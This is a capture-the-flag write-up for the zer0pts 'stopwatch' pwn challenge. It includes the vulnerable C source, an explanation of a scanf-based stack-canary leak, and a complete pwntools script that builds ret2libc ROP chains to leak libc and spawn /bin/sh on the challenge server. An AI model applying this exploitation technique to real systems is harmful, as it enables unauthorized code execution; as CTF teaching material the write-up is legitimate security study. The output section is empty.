# **STOPWATCH**
## Task
nc pwn.ctf.zer0pts.com 9002
File: chall libc.so.6 main.c
Tag: pwn
## Solution
### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
No PIE assume to overwrite the GOT
Partial RERLO

## Source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>

char name[0x80];

void readuntil(char t) {
  char c;
  do {
    c = getchar();
    if (c == EOF) exit(1);
  } while(c != t);
}

int ask_again(void) {
  char buf[0x10];
  printf("Play again? (Y/n) ");
  scanf("%s", buf);
  readuntil('\n');
  if (buf[0] == 'n' || buf[0] == 'N')
    return 0;
  else
    return 1;
}

void ask_time(double *t) {
  printf("Time[sec]: ");
  scanf("%lf", t);
  readuntil('\n');
}

double play_game(void) {
  struct timeval start, end;
  double delta, goal, diff;

  ask_time(&goal);
  printf("Stop the timer as close to %lf seconds as possible!\n", goal);
  puts("Press ENTER to start / stop the timer.");

  readuntil('\n');
  gettimeofday(&start, NULL);
  puts("Timer started.");

  readuntil('\n');
  gettimeofday(&end, NULL);
  puts("Timer stopped.");

  diff = end.tv_sec - start.tv_sec
    + (double)(end.tv_usec - start.tv_usec) / 1000000;

  if (diff == goal) {
    printf("Exactly %lf seconds! Congratulaions!\n", goal);
  } else if (diff < goal) {
    delta = goal - diff;
    printf("Faster by %lf sec!\n", delta);
  } else {
    delta = diff - goal;
    printf("Slower by %lf sec!\n", delta);
  }
  if (delta > 0.5) {
    puts("Too lazy. Try harder!");
  }

  return delta;
}

unsigned char ask_number(void) {
  unsigned int n;
  printf("How many times do you want to try?\n> ");
  scanf("%d", &n);
  return (unsigned char)n;
}

void ask_name(void) {
  char _name[0x80];
  printf("What is your name?\n> ");
  scanf("%s", _name);
  strcpy(name, _name);
}

/**
 * Entry Point
 */
int main(void) {
  unsigned char i, n;
  double *records, best = 31137.31337;

  ask_name();
  n = ask_number();
  records = (double*)alloca(n * sizeof(double));

  for(i = 0; i < n; i++) records[i] = 31137.31337;

  for(i = 0; ; i++) {
    printf("-=-=-=-= CHALLENGE %03d =-=-=-=-\n", i + 1);
    records[i] = play_game();
    if (i >= n - 1) break;
    if (!ask_again()) break;
  }

  for(i = 0; i < n; i++) {
    if (best > records[i]) {
      best = records[i];
    }
  }
  puts("-=-=-=-= RESULT =-=-=-=-");
  printf("Name: %s\n", name);
  printf("Best Score: %lf\n", best);

  return 0;
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(300);
}
```
`scanf("%s")` -> Using '+' or '-' when calling scanf results in an uninitialized variable. (canary leak)
Then abuse the canary leak to leak the `lib_base address`
Finally, call the `system` with `/bin/sh` parameter to receive shell
## Script python using pwntools
```python
from pwn import *

def double_to_hex(f):
    return hex(struct.unpack('<Q', struct.pack('<d', float(f)))[0])

elf = ELF("./chall")
libc = ELF("./libc.so.6")
rop = ROP(elf)
while True: # repeat until received canary
    #p = process("./chall")
    p = remote("pwn.ctf.zer0pts.com", 9002)

    pay = b"A"*30
    p.sendlineafter("> ", pay)
    p.sendlineafter("> ", "15")

    p.sendlineafter("Time[sec]: ", "+") # leak the libc

    p.recvuntil("close to ")
    canary = p.recvline()
    sIdx = canary.find(b" seconds")
    canary = canary[:-22]
    canary = double_to_hex(canary) # receive canary
    print(canary)
    if canary == '0x8000000000000000':
        continue
    if eval(canary) != 0:
        break

pop_rdi_addr = rop.find_gadget(['pop rdi', 'ret'])[0] # this rop gadget to pass argument for function because this is 64-bits file
p.sendline("\n")

pay = b"A" * 0x18
pay += p64(int(canary, 16)) # by pass bof protection
pay += b"A" * 0x8
pay += p64(pop_rdi_addr) # pass argument for puts
pay += p64(elf.sym.got.__libc_start_main) # argument is address of _libc_start_main func
pay += p64(elf.plt['puts']) # call puts to leak the address of _libc_start_main func
pay += p64(elf.sym.ask_again)
p.sendlineafter(" (Y/n) ", pay)
leak = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = leak - libc.symbols['__libc_start_main'] # leak libc_base address
system = libc_base + libc.symbols['system'] #caculate real system address server
binsh = libc_base + list(libc.search(b'/bin/sh'))[0] #get address of '/bin/sh'

pay = b"A" * 0x18
pay += p64(int(canary, 16)) # bypass bof protection
pay += b"A" * 0x8
pay += p64(pop_rdi_addr+1) # ret alignment the stack of 64 bit when call system
pay += p64(pop_rdi_addr) #pop rdi; ret  pass argument
pay += p64(binsh) #b'/bin/sh' = argument
pay += p64(system) # call system
p.sendlineafter(" (Y/n) ", pay)

p.interactive() #got shell
```
### Output
